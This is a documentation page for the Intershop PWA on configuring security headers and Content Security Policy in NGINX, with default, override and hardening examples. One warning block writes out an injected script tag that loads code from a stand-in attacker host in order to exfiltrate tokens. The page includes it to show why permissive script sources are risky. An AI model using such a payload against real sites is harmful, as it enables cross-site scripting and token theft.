<!--
kb_guide
kb_pwa
kb_everyone
kb_sync_latest_only
-->

# Security Headers and Content Security Policy (CSP)

- [Introduction](#introduction)
- [Where Headers Are Managed](#where-headers-are-managed)
- [Shipped Default Headers](#shipped-default-headers)
  - [Why the Defaults Are Permissive](#why-the-defaults-are-permissive)
  - [The First Step Against XSS: Adjust `script-src`](#the-first-step-against-xss-adjust-script-src)
- [How Headers Are Configured](#how-headers-are-configured)
  - [Source Resolution and Precedence](#source-resolution-and-precedence)
  - [Whole-Source Replacement, Not Merge](#whole-source-replacement-not-merge)
- [Configuration Use Cases](#configuration-use-cases)
  - [1. Override Certain Values](#1-override-certain-values)
  - [2. Add Configuration](#2-add-configuration)
  - [3. Remove All Headers](#3-remove-all-headers)
- [Common Third-Party Scenarios](#common-third-party-scenarios)
- [Hardening for PCI DSS 4.0](#hardening-for-pci-dss-40)
- [Further References](#further-references)

## Introduction

Modern browsers rely on HTTP response headers to enforce important security boundaries.
The most relevant one is the **Content Security Policy (CSP)**, which restricts the origins from which scripts, styles, images, fonts, and connections may be loaded, mitigating cross-site scripting (XSS) and data injection attacks.
Additional headers such as `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` and `Cross-Origin-Opener-Policy` further harden the browser environment.

This guide is the single source of truth for configuring these headers in the Intershop PWA.
It explains the headers that ship by default, how the configuration mechanism works, and how projects and sales environments can override, extend, or remove them.

## Where Headers Are Managed

The Intershop PWA manages security headers in the **NGINX layer**, not in the Angular application or the SSR Express server.
NGINX adds the configured headers to the main storefront location responses, including cached pages.
Some locations — for example static assets and the sitemap — are served without them.

## Shipped Default Headers

The standard PWA ships a secure-by-default, yet deliberately permissive, baseline in [nginx/additional-headers.yaml](../../nginx/additional-headers.yaml).

### Why the Defaults Are Permissive

The default policy intentionally allows `https:` sources so that a typical storefront using third-party analytics, payment providers, or a CDN keeps working out of the box, while vulnerability scanners still see the required headers.

- `'unsafe-inline'` is kept for `script-src` and `style-src` because the PWA and common integrations (e.g., tag managers) rely on inline scripts and styles.
- `'unsafe-eval'` is not included, because production builds do not require it.
- Clickjacking protection (`frame-ancestors` / `X-Frame-Options`) is deliberately left off so the PWA can still be embedded in the ICM design preview and the IAP design view.
- `Cross-Origin-Opener-Policy` uses `same-origin-allow-popups` so popup-based checkout and payment flows are not broken.

> [!IMPORTANT]
> The permissive defaults are a baseline that prevents storefronts from breaking, **not** a PCI DSS 4.0-compliant policy.
> For payment pages, tighten the policy to explicit origins and **remove** `'unsafe-inline'`.
> See [Hardening for PCI DSS 4.0](#hardening-for-pci-dss-40).

### The First Step Against XSS: Adjust `script-src`

> [!WARNING]
> As long as `script-src` contains `'unsafe-inline'`, the CSP provides **no protection against inline-script XSS**.
> Injected `<script>...</script>` blocks, `javascript:` URLs, and inline event handlers (`onerror`, `onload`, `onclick`, and every `on*` attribute) all still execute.
> The single most effective hardening step is to **remove `'unsafe-inline'` from `script-src`**.

The shipped default keeps `'unsafe-inline'` only so that storefronts and integrations that still rely on inline scripts do not break out of the box.
Once your project no longer depends on inline scripts, drop `'unsafe-inline'` **and** the broad `https:` source from `script-src`:

```text
# permissive default (inline XSS NOT blocked; external scripts from ANY HTTPS host allowed)
script-src 'self' 'unsafe-inline' https:;

# hardened (inline XSS blocked; only same-origin scripts allowed)
script-src 'self';
```

> [!WARNING]
> Removing `'unsafe-inline'` is only half the job: the bare `https:` in `script-src` trusts **every** HTTPS origin for scripts.
> An attacker who can inject HTML can then load an external script from any host they control — for example `<script src="https://attacker.example/evil.js"></script>` — and the browser will fetch and execute it, allowing it to read and exfiltrate tokens.
> Drop the bare `https:` and list only the specific script origins you trust.

Allow specific third-party scripts by adding their explicit origins (see [Common Third-Party Scenarios](#common-third-party-scenarios)) or a per-request nonce/hash — never by re-adding `'unsafe-inline'` or a bare `https:`.

> [!NOTE]
> `'unsafe-inline'` in `style-src` is far less dangerous than in `script-src` and is often kept, because the PWA and Bootstrap rely on inline styles.
> Prioritize removing it from `script-src` first.

## How Headers Are Configured

There are two ways to provide the header source:

1. **At build time** – edit [nginx/additional-headers.yaml](../../nginx/additional-headers.yaml). The values are baked into the custom NGINX image, so no runtime variable is needed.
2. **At runtime** – set the `ADDITIONAL_HEADERS` environment variable (or `ADDITIONAL_HEADERS_SOURCE` for an external [gomplate datasource](https://docs.gomplate.ca/datasources/)).

The YAML format is a list of single-key entries under `headers:`:

```yaml
headers:
  - Header-Name: 'header value'
  - Another-Header: 'another value'
```

### Source Resolution and Precedence

At container start, [nginx/docker-entrypoint.d/40-gomplate.sh](../../nginx/docker-entrypoint.d/40-gomplate.sh) resolves the header source in this order:

1. `ADDITIONAL_HEADERS_SOURCE` if set (an explicit gomplate datasource URI), otherwise
2. `ADDITIONAL_HEADERS` if set – the runtime value is used and the shipped file is **ignored entirely**, otherwise
3. the baked-in [nginx/additional-headers.yaml](../../nginx/additional-headers.yaml) file.

### Whole-Source Replacement, Not Merge

Setting `ADDITIONAL_HEADERS` **replaces the complete header list**; it does not merge with the shipped defaults.
Whatever source wins provides the full set of headers that NGINX emits.
There is no per-header override.
This has direct consequences for the three use cases below.

> [!NOTE]
> Setting `ADDITIONAL_HEADERS` to an empty string (`''`) does **not** clear the headers.
> The entrypoint treats an empty value as unset and falls back to the shipped defaults.
> To remove headers, provide a source with an empty list, as shown in [Remove All Headers](#3-remove-all-headers).

## Configuration Use Cases

Because the source is replaced as a whole, overriding or extending headers means providing the **full desired list**, not just the delta.

### 1. Override Certain Values

To change one or more values (for example, to lock the CSP down to your known ICM host and payment provider), copy the full list and adjust the entries you need.

`docker-compose` example:

```yaml
nginx:
  environment:
    ADDITIONAL_HEADERS: |
      headers:
        - Content-Security-Policy: "default-src 'self' https://your-icm-host; script-src 'self' https://www.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://www.google-analytics.com; frame-src 'self' https://secure.pay1.de; base-uri 'self'; object-src 'none'; frame-ancestors 'self' https://your-icm-host;"
        - X-Content-Type-Options: 'nosniff'
        - Referrer-Policy: 'strict-origin-when-cross-origin'
        - Permissions-Policy: 'camera=(), microphone=(), geolocation=(self)'
        - Cross-Origin-Opener-Policy: 'same-origin-allow-popups'
```

[PWA Helm Chart](https://github.com/intershop/helm-charts/tree/main/charts/pwa) example (use `cache.additionalHeaders` with the same content):

```yaml
cache:
  additionalHeaders: |
    headers:
      - Content-Security-Policy: "default-src 'self' https://your-icm-host; style-src 'self' 'unsafe-inline'; font-src 'self' data:; object-src 'none';"
      - X-Content-Type-Options: 'nosniff'
```

> [!TIP]
> For a permanent, image-level change, edit [nginx/additional-headers.yaml](../../nginx/additional-headers.yaml) directly instead of passing `ADDITIONAL_HEADERS` at runtime.

### 2. Add Configuration

To add an extra header or additional trusted origins, provide the defaults **plus** your additions in the full list.

```yaml
nginx:
  environment:
    ADDITIONAL_HEADERS: |
      headers:
        # keep the defaults you still want ...
        - Content-Security-Policy: "default-src 'self' https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https:; frame-src 'self' https:; child-src 'self' blob: https:; worker-src 'self' blob:; form-action 'self' https:; base-uri 'self'; object-src 'none';"
        - X-Content-Type-Options: 'nosniff'
        - Referrer-Policy: 'strict-origin-when-cross-origin'
        - Permissions-Policy: 'camera=(), microphone=(), geolocation=(self)'
        - Cross-Origin-Opener-Policy: 'same-origin-allow-popups'
        # ... and add the new headers
        - Strict-Transport-Security: 'max-age=63072000; includeSubDomains; preload'
        - X-Frame-Options: 'SAMEORIGIN'
```

### 3. Remove All Headers

Provide a source that contains a valid but **empty** `headers:` list, so NGINX emits no `add_header` directives.
This is not the same as leaving `ADDITIONAL_HEADERS` empty (`''`): an empty string counts as "not set" and falls back to the shipped defaults, whereas the value below is real YAML content that just defines zero entries.

```yaml
nginx:
  environment:
    ADDITIONAL_HEADERS: |
      headers:
```

For a permanent, image-level removal, reduce [nginx/additional-headers.yaml](../../nginx/additional-headers.yaml) to a single `headers:` line.

## Common Third-Party Scenarios

When extending the PWA, identify **all** origins a resource loads from (using browser dev tools or the vendor documentation) and add them to the matching directives.

| Integration        | Directives typically needed                                                                                                                                            |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Google Tag Manager | `script-src https://www.googletagmanager.com`, `connect-src https://www.google-analytics.com https://analytics.google.com`, `img-src https://www.google-analytics.com` |
| Google Fonts       | `style-src https://fonts.googleapis.com`, `font-src https://fonts.gstatic.com`                                                                                         |
| Payone             | `script-src https://secure.pay1.de`, `frame-src https://secure.pay1.de`                                                                                                |
| PayPal             | `script-src https://www.paypal.com`, `frame-src https://www.paypal.com`, `connect-src https://www.paypal.com`                                                          |
| SPARQUE.AI         | `connect-src https://api.search.sparque.ai` (or the policy enforcer origin)                                                                                            |

Example CSP fragment that adds Google Tag Manager to a locked-down policy:

```
Content-Security-Policy: "default-src 'self'; script-src 'self' https://www.googletagmanager.com; connect-src 'self' https://www.google-analytics.com https://analytics.google.com; img-src 'self' data: https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com;"
```

## Hardening for PCI DSS 4.0

The permissive defaults avoid breaking storefronts; they are **not** a PCI DSS 4.0-compliant policy.
When hardening the shipped baseline for payment pages, re-enable the clickjacking protection the default deliberately omits by adding `frame-ancestors` (and optionally `X-Frame-Options: SAMEORIGIN`) once design preview / IAP embedding is no longer required.

The remaining measures — authorizing every script (Requirement 6.4.3), removing `'unsafe-inline'`, avoiding wildcard origins, applying Subresource Integrity (SRI), and maintaining a script inventory — are covered in the [Security Standard PCI DSS 4.0](pci-dss-4.md) guide.

## Further References

- [Building and Running NGINX Docker Image](nginx-startup.md#add-additional-headers)
- [Security Standard PCI DSS 4.0](pci-dss-4.md)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [gomplate datasources](https://docs.gomplate.ca/datasources/)
